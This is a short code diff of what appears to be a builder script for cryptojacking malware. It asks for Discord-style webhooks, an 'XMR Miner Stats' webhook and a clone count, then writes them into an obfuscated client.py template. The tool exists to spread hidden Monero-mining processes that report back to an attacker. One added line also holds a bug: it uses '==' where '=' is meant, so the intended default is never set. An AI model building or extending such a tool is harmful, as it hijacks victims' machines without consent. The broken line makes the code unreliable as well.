@@ -6,12 +6,14 @@ import pyImpossibleObf
 
 key ="loooood"
 webhook = input("Webhook : ")
+webhookstats = input("XMR Miner Stats : Webhook : ")
+if(webhookstats == ""):
+	webhookstats == "NoWebhook"
 processnumbers = input("Number of clones (default : 3) : ")
-wallets = input("XMR Wallet : ")
 if processnumbers == "":
 	processnumbers = "3"
 filecontent = open("client.py", "r").read()
-filecontent = filecontent.replace("webhook667", webhook).replace("processnumbers", str(processnumbers))
+filecontent = filecontent.replace("webhook667", str(webhook)).replace("processnumbers", str(processnumbers)).replace("NoWebhook667EKIP", str(webhookstats))
 open("client.py", "w",encoding="utf-8").write(str(filecontent))
 print("[.] Replaced variables in file.")
 
